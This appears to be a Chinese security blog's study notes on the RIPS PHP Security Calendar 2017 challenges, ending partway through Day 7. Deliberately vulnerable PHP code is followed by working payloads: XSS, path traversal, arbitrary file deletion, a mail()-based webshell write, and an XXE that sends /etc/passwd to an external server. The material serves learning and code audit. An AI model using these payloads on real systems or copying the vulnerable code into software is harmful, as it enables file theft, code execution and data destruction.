@@ -1,0 +1,2068 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="RIPS-PHP-SECURITY-CALENDAR-2017学习记录.md, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>RIPS-PHP-SECURITY-CALENDAR-2017学习记录.md | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/2017php.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">RIPS-PHP-SECURITY-CALENDAR-2017学习记录.md</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-19
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-03-31
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    8.4k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>题目地址： <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>
+<p>RIPS团队在17年12月1-24日发布的新年礼物–每日一个PHP代码挑战，包含了一些新颖的知识点。</p>
+</blockquote>
+<h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><p><strong>code:</strong></p>
+<pre><code class="php">class Challenge &#123;
+  const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
+  private $file;
+  private $whitelist;
+
+  public function __construct($file) &#123;
+    $this-&gt;file = $file;
+    $this-&gt;whitelist = range(1, 24);
+  &#125;
+
+  public function __destruct() &#123;
+    if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;
+      move_uploaded_file(
+        $this-&gt;file[&#39;tmp_name&#39;],
+        self::UPLOAD_DIRECTORY . $this-&gt;file[&#39;name&#39;]
+      );
+    &#125;
+  &#125;
+&#125;
+
+$challenge = new Challenge($_FILES[&#39;solution&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>存在任意文件上传漏洞，造成漏洞的代码：</p>
+<pre><code class="php">if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;</code></pre>
+<p>代码的目的是想要通过 <code>in_array()</code> 来判断文件名是否为整数，但是这里<code>in_array()</code>函数未设置第三个参数，导致了安全问题。</p>
+<p><code>in_array</code>函数在第三个参数未设置时默认为false，在比较的时候使用宽松比较，在比较文件名时会进行类型转换，例如<code>6shell.php</code>就会通过比较成功上传，下面是手册中的函数定义。</p>
+<blockquote>
+<p> <strong>in_array</strong></p>
+<p>in_array — 检查数组中是否存在某个值</p>
+<p><strong>说明</strong></p>
+<p>bool in_array ( <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] )</p>
+<p>在 <code>haystack</code> 中搜索 <code>needle</code>，如果没有设置 <code>strict</code> 则使用宽松的比较。</p>
+</blockquote>
+<h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><p><strong>code:</strong></p>
+<pre><code class="php">// composer require &quot;twig/twig&quot;
+require &#39;vendor/autoload.php&#39;;
+
+class Template &#123;
+  private $twig;
+
+  public function __construct() &#123;
+    $indexTemplate = &#39;&lt;img &#39; .
+      &#39;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#39; .
+      &#39;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#39;;
+
+    // Default twig setup, simulate loading
+    // index.html file from disk
+    $loader = new Twig\Loader\ArrayLoader([
+      &#39;index.html&#39; =&gt; $indexTemplate
+    ]);
+    $this-&gt;twig = new Twig\Environment($loader);
+  &#125;
+
+  public function getNexSlideUrl() &#123;
+    $nextSlide = $_GET[&#39;nextSlide&#39;];
+    return filter_var($nextSlide, FILTER_VALIDATE_URL);
+  &#125;
+
+  public function render() &#123;
+    echo $this-&gt;twig-&gt;render(
+      &#39;index.html&#39;,
+      [&#39;link&#39; =&gt; $this-&gt;getNexSlideUrl()]
+    );
+  &#125;
+&#125;
+
+(new Template())-&gt;render();</code></pre>
+<p><strong>漏洞：</strong></p>
+<p><code>twig</code> 是 PHP 的一个模板引擎。该代码存在XSS漏洞。</p>
+<p>代码中有两处过滤，第一处在<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>，使用了FILTER_VALIDATE_URL 过滤器，没有使用标志来检验url，所以此处过滤很弱，只验证了<code>：//</code></p>
+<blockquote>
+<p> <a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener">*filter_var** </a>： (PHP 5 &gt;= 5.2.0, PHP 7)</p>
+<p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p>
+<p><strong>定义</strong> [mixed <strong>filter_var</strong> ( mixed<code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, mixed <code>$options</code> ]] )</p>
+</blockquote>
+<pre><code class="php">php &gt; var_dump(filter_var(&#39;qaq://lanvnal&#39;,FILTER_VALIDATE_URL));
+string(13) &quot;qaq://lanvnal&quot;</code></pre>
+<p>第二处过滤是<code>&#123;&#123;link|escape&#125;&#125;</code>，这是twig自带的过滤器，在<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">twig的文档</a>中我们可以知道它是通过PHP的<code>htmlspecialchars</code>来实现的，他会将特殊字符转换为 HTML 实体。</p>
+<pre><code>Internally, escape uses the PHP native htmlspecialchars function for the HTML escaping strategy.</code></pre>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener"><strong>htmlspecialchars</strong> </a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：将特殊字符转换为 HTML 实体</p>
+<p><strong>定义</strong> ：string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(“default_charset”) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
+<pre><code>&amp; (&amp; 符号)  ===============  &amp;amp;
+&quot; (双引号)  ===============  &amp;quot;
+&#39; (单引号)  ===============  &amp;apos;
+&lt; (小于号)  ===============  &amp;lt;
+&gt; (大于号)  ===============  &amp;gt;</code></pre>
+</blockquote>
+<p>可以使用JavaScript伪协议绕过。eg：</p>
+<pre><code>&lt;a href=&quot;javascript:;&quot;&gt;这个标签中的javascript是啥意思？&lt;/a&gt;
+
+href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。
+这里的href=”javascript:;”，其中javascript:是伪协议，它可以让我们通过一个链接来调用javascript函数。javascript:是表示在触发&lt;a&gt;默认动作时，执行一段JavaScript代码</code></pre>
+<p>所以绕过两处过滤的payload为：<code>nextSlide=javascript://aaa％250aalert(1)</code>（%25是%的url编码）</p>
+<p><code>://</code>绕过了<code>FILTER_VALIDATE_URL</code>过滤器，经过<code>escape</code>过滤器后link值为<code>javascript://aaa%0aalert(1)</code>，%0a为换行符，<code>//</code>注释掉了换行前面的内容，然后点击a标签链接就会触发XSS。</p>
+<h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><p><strong>Code:</strong></p>
+<pre><code class="php">function __autoload($className) &#123;
+    include $className;
+&#125;
+
+$controllerName = $_GET[&#39;c&#39;];
+$data = $_GET[&#39;d&#39;];
+
+if (class_exists($controllerName)) &#123;
+    $controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);
+    $controller-&gt;render();
+&#125; else &#123;
+    echo &#39;There is no page with this name&#39;;
+&#125;
+
+class HomeController &#123;
+    private $template;
+    private $variables;
+
+    public function __construct($template, $variables) &#123;
+        $this-&gt;template = $template;
+        $this-&gt;variables = $variables;
+    &#125;
+
+    public function render() &#123;
+        if ($this-&gt;variables[&#39;new&#39;]) &#123;
+            echo &#39;controller rendering new response&#39;;
+        &#125; else &#123;
+            echo &#39;controller rendering old response&#39;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>第一个是文件包含，需要特定PHP版本（PHP5~5.3包含5.3版本）。</p>
+<p> <strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。</p>
+<p>payload：<code>../../../../../../passwd</code></p>
+<p>第二个漏洞在<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code></p>
+<p>实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP的内置函数，并通过上面代码实例化。我们可以借助PHP中的<code>SimpleXMLElement</code>类来完成XXE攻击。</p>
+<p>payload：</p>
+<pre><code>http://localhost/test2.php?c=SimpleXMLElement&amp;d=&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % remote SYSTEM &quot;http://外网地址/evil.dtd&quot;&gt;
+%remote;
+%send;
+]&gt;</code></pre>
+<p>其中的<code>evil.dtd</code>内容是:</p>
+<pre><code>&lt;!ENTITY % all
+        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;外网地址/1.php?file=%file;&#39;&gt;&quot;
+        &gt;
+        %all;</code></pre>
+<p>其中的<code>1.php</code>的地址是：</p>
+<pre><code>file_put_contents(&quot;result.txt&quot;, $_GET[&#39;file&#39;]);</code></pre>
+<p>这样就完成了攻击。</p>
+<h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><p><strong>Code:</strong></p>
+<pre><code class="php">class Login &#123;
+  public function __construct($user, $pass) &#123;
+    $this-&gt;loginViaXml($user, $pass);
+  &#125;
+
+  public function loginViaXml($user, $pass) &#123;
+    if (
+      (!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;
+      (!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))
+    ) &#123;
+      $format = &#39;&lt;?xml version=&quot;1.0&quot;?&gt;&#39; .
+        &#39;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#39;;
+      $xml = sprintf($format, $user, $pass);
+      $xmlElement = new SimpleXMLElement($xml);
+      // Perform the actual login.
+      $this-&gt;login($xmlElement);
+    &#125;
+  &#125;
+&#125;
+
+new Login($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>问题出在<code>strpos</code>函数和PHP的自动类型转换上。eg：</p>
+<pre><code class="php">php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;a&#39;));
+int(0)
+php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;x&#39;));
+bool(false)
+php &gt; var_dump(0==false);
+bool(true)</code></pre>
+<p>如果我们传入的<code>username</code>和<code>password</code>的首位字符是<code>&lt;</code>或者是<code>&gt;</code>就可以绕过限制，那么最后的pyaload就是：</p>
+<pre><code>username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</code></pre>
+<p>最终传入到<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p>
+<h2 id="Day-5-Postcard"><a href="#Day-5-Postcard" class="headerlink" title="Day 5 - Postcard"></a>Day 5 - Postcard</h2><p><strong>code:</strong></p>
+<pre><code class="php">class Mailer &#123;
+  private function sanitize($email) &#123;
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;
+      return &#39;&#39;;
+    &#125;
+
+    return escapeshellarg($email);
+  &#125;
+
+  public function send($data) &#123;
+    if (!isset($data[&#39;to&#39;])) &#123;
+      $data[&#39;to&#39;] = &#39;none@ripstech.com&#39;;
+    &#125; else &#123;
+      $data[&#39;to&#39;] = $this-&gt;sanitize($data[&#39;to&#39;]);
+    &#125;
+
+    if (!isset($data[&#39;from&#39;])) &#123;
+      $data[&#39;from&#39;] = &#39;none@ripstech.com&#39;;
+    &#125; else &#123;
+      $data[&#39;from&#39;] = $this-&gt;sanitize($data[&#39;from&#39;]);
+    &#125;
+
+    if (!isset($data[&#39;subject&#39;])) &#123;
+      $data[&#39;subject&#39;] = &#39;No Subject&#39;;
+    &#125;
+
+    if (!isset($data[&#39;message&#39;])) &#123;
+      $data[&#39;message&#39;] = &#39;&#39;;
+    &#125;
+
+    mail($data[&#39;to&#39;], $data[&#39;subject&#39;], $data[&#39;message&#39;],
+      &#39;&#39;, &quot;-f&quot; . $data[&#39;from&#39;]);
+  &#125;
+&#125;
+
+$mailer = new Mailer();
+$mailer-&gt;send($_POST);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p>
+<pre><code class="php">bool mail (
+    string $to ,
+    string $subject ,
+    string $message [,
+    string $additional_headers [,
+    string $additional_parameters ]]
+)</code></pre>
+<p>其参数含义分别表示如下：</p>
+<blockquote>
+<ul>
+<li>to，指定邮件接收者，即接收人</li>
+<li>subject，邮件的标题</li>
+<li>message，邮件的正文内容</li>
+<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
+<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
+</ul>
+</blockquote>
+<p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/" target="_blank" rel="noopener">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
+<blockquote>
+<ul>
+<li><p>-O option = value</p>
+<p>QueueDirectory = queuedir 选择队列消息</p>
+</li>
+<li><p>-X logfile</p>
+<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
+</li>
+<li><p>-f from email</p>
+<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
+</li>
+</ul>
+</blockquote>
+<p>eg:</p>
+<pre><code class="php">&lt;?php
+  $to = &#39;Alice@example.com&#39;;
+    $subject = &#39;Hello Alice!&#39;;
+    $message = &#39;&lt;?php phpinfo(); ?&gt;&#39;;
+    $header = &#39;CC: somebodyelse@example.com&#39;;
+    $options = &#39;-OQueueDirectory = /tmp -X /var/www/html/shell.php&#39;;
+    mail($to, $subject, $message, $header, $options);
+?&gt;</code></pre>
+<p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>/var/www/html/rce.php</strong> 中写入如下数据：</p>
+<pre><code>17220 &lt;&lt;&lt; To: Alice@example.com
+ 17220 &lt;&lt;&lt; Subject: Hello Alice!
+ 17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php
+ 17220 &lt;&lt;&lt; CC: somebodyelse@example.com
+ 17220 &lt;&lt;&lt;
+ 17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;
+ 17220 &lt;&lt;&lt; [EOF]</code></pre>
+<p>然后是过滤函数，这里<strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸。</p>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md</a></p>
+<p><a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php" target="_blank" rel="noopener">https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php</a></p>
+<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
+</blockquote>
+<h2 id="Day-6-Frost-Pattern"><a href="#Day-6-Frost-Pattern" class="headerlink" title="Day 6 - Frost Pattern"></a>Day 6 - Frost Pattern</h2><p><strong>code:</strong></p>
+<pre><code class="php">class TokenStorage &#123;
+    public function performAction($action, $data) &#123;
+        switch ($action) &#123;
+            case &#39;create&#39;:
+                $this-&gt;createToken($data);
+                break;
+            case &#39;delete&#39;:
+                $this-&gt;clearToken($data);
+                break;
+            default:
+                throw new Exception(&#39;Unknown action&#39;);
+        &#125;
+    &#125;
+
+    public function createToken($seed) &#123;
+        $token = md5($seed);
+        file_put_contents(&#39;/tmp/tokens/&#39; . $token, &#39;...data&#39;);
+    &#125;
+
+    public function clearToken($token) &#123;
+        $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);
+        unlink(&#39;/tmp/tokens/&#39; . $file);
+    &#125;
+&#125;
+
+$storage = new TokenStorage();
+$storage-&gt;performAction($_GET[&#39;action&#39;], $_GET[&#39;data&#39;]);</code></pre>
+<p><strong>漏洞：</strong></p>
+<p>正则表达式有问题，开发者本来的意思应该是将<code>a-z</code>和<code>.-_</code>这三个符号外的全部替换为空，这样<code>../../../xx</code>就无法使用，防止进行路径穿越。但是没对<code>-</code>进行转义，所以匹配范围就变成了<code>a-z</code>和<code>.</code> 字符到 <code>_</code> 字符之间的所有字符。</p>
+<table>
+<thead>
+<tr>
+<th align="left">正则表达式</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">[^a-zA-Z]</td>
+<td align="left">它匹配任何不包含从a到z、A到Z的字符的字符串。</td>
+</tr>
+</tbody></table>
+<pre><code>&gt;&gt;&gt; ord(&#39;.&#39;)
+46
+&gt;&gt;&gt; ord(&#39;_&#39;)
+95
+&gt;&gt;&gt; ord(&#39;/&#39;)
+47</code></pre>
+<p>完美避开了<code>../</code>字符，这样就造成了目录穿越，上面代码可以进行任意文件删除了。</p>
+<p>payload：</p>
+<pre><code>action=delete&amp;data=../../config.php</code></pre>
+<h2 id="Day-7-Bells"><a href="#Day-7-Bells" class="headerlink" title="Day 7 - Bells"></a>Day 7 - Bells</h2><p><strong>code:</strong></p>
+<pre><code class="php">function getUser($id) &#123;
+    global $config, $db;
+    if (!is_resource($db)) &#123;
+        $db = new MySQLi(
+            $config[&#39;dbhost&#39;],
+            $config[&#39;dbuser&#39;],
+            $config[&#39;dbpass&#39;],
+            $config[&#39;dbname&#39;]
+        );
+    &#125;
